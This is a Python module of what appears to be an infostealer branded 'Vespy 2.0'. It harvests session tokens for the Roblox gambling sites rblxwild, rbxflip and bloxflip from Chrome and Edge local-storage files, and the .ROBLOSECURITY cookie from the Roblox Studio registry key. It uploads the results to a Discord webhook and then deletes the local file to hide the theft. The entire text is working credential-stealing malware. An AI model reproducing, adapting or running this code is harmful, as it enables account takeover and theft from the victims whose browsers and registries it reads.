class Roblox:

    def __init__(self):
        self.FILE = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),"w+")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        self.clearbet = 0
        self.done = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        self.done = 0
        for i in paths:
            if os.path.exists(i):
                self.Rblxwild(i)
        self.done = 0
        for i in paths:
            if os.path.exists(i):
                self.Rbxflip(i)
        self.done = 0
        for i in paths:
            if os.path.exists(i):
                self.Bloxflip(i)
        self._upload()

    def Rblxwild(self,p):
        if self.done == 0:
            self.FILE.write("\n\n"+"="*35+"[ Rblxwild ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass

    def Rbxflip(self,p):
        if self.done == 0:
            self.FILE.write("\n\n"+"="*35+"[ Rbxflip ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass

    def Bloxflip(self,p):
        if self.done ==0:
            self.FILE.write("\n\n"+"="*35+"[ Bloxflip ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass

    def RobloxStudio(self):
        if self.done == 0:
            self.FILE.write("\n\n"+"="*35+"[ Roblox Cookies ]"+"="*35+"\n")
            self.done +=1
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1]
                    self.robloxcookies += 1
                    self.FILE.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
    
    def _upload(self):
        self.FILE.close()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),'rb').read(),filename="Roblox.txt")
        embed = DiscordEmbed(title=f"Roblox Tokens and Cookies", description=f"Found Roblox Tokens and Cookies", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f"Info Grabbed\n", value=f"\n:coin: RblxWild: ``{self.rblxwild} Tokens``\n\n:coin: Rbxflip: ``{self.rbxflip} Tokens``\n\n:coin: Bloxflip: ``{self.bloxflip} Tokens``\n\n:cookie: Roblox Cookie: ``{self.robloxcookies} Cookie``\n")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"))
